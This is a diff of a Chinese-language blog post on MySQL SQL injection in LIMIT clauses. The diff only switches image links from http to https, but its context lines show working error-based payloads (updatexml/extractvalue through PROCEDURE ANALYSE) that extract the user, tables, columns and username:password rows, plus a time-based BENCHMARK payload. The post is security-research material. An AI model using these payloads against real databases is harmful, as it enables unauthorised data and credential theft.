@@ -15,7 +15,7 @@
           <h1 id="mysql-in-limit-sql-injection">Mysql in Limit Sql Injection</h1>
 <p class="date">25 Jan 2015 - Tr3jer_CongRong</p>
 <center>
-<img src="http://ww1.sinaimg.cn/mw690/9c5c5d93tw1erpyb5brduj20go08hgmc.jpg" />
+<img src="https://ww1.sinaimg.cn/mw690/9c5c5d93tw1erpyb5brduj20go08hgmc.jpg" />
 </center>
 
 <blockquote>
@@ -57,7 +57,7 @@ select_expr [, select_expr ...]
   <p>一个测试表:</p>
 </blockquote>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/34324b9a.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/34324b9a.png" /></p>
 
 <p><strong>ANALYSE函数是可以查看表的优化建议</strong></p>
 
@@ -69,7 +69,7 @@ select_expr [, select_expr ...]
 <pre><code>select * from injection where id&gt;0 order by id limit 0,1 procedure analyse(1,1);
 </code></pre>
 
-<p><img src="http://ww4.sinaimg.cn/mw690/9c5c5d93tw1erqfqij043j20vo02qdhl.jpg" /></p>
+<p><img src="https://ww4.sinaimg.cn/mw690/9c5c5d93tw1erqfqij043j20vo02qdhl.jpg" /></p>
 
 <p>看起来并不是很好，尝试下在<code>max_elements</code>处添加条件表达式:</p>
 
@@ -78,7 +78,7 @@ select_expr [, select_expr ...]
 
 <p>但是立即返回了一个错误信息:</p>
 
-<p><img src="http://ww1.sinaimg.cn/mw690/9c5c5d93tw1erqfqhkijbj20vk02u40x.jpg" /></p>
+<p><img src="https://ww1.sinaimg.cn/mw690/9c5c5d93tw1erqfqhkijbj20vk02u40x.jpg" /></p>
 
 <blockquote>
   <p>sleep函数没执行,不过还是有办法的,利用updatexml or extractvalue函数进行报错注入:</p>
@@ -89,35 +89,35 @@ select_expr [, select_expr ...]
 <pre><code>select * from injection where id&gt;0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,user()),0),1);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/213h8sad.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/213h8sad.png" /></p>
 
 <p><strong>爆表:</strong></p>
 
 <pre><code>select * from injection where id&gt;0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),0),1);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/XA78as89.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/XA78as89.png" /></p>
 
 <p><strong>爆字段:</strong></p>
 
 <pre><code>select * from injection where id&gt;0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name='injection' limit 0,1)),0),1);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/32BSF8.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/32BSF8.png" /></p>
 
 <p><strong>爆数据:</strong></p>
 
 <pre><code>select * from injection where id&gt;0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat_ws(':',id,username,password) from injection limit 0,1)),0),1);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/sad782eq.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/sad782eq.png" /></p>
 
 <p><strong>如果不支持报错注入的话,还可以基于时间注入:</strong></p>
 
 <pre><code>SELECT * FROM injection WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3ewg87sdfb.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/3ewg87sdfb.png" /></p>
 
 <blockquote>
   <p>一个Demo:</p>
@@ -147,13 +147,13 @@ if($obj-&gt;query($sql)){
 mysql_close($obj);
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/3neiuwyfd.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/3neiuwyfd.png" /></p>
 
 <blockquote>
   <p>执行的语句:</p>
 </blockquote>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/2nuefdys8.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/2nuefdys8.png" /></p>
 
 <blockquote>
   <p>Mysql内建的特性有很多,不过能够利用的缺陷还有待挖掘:)</p>
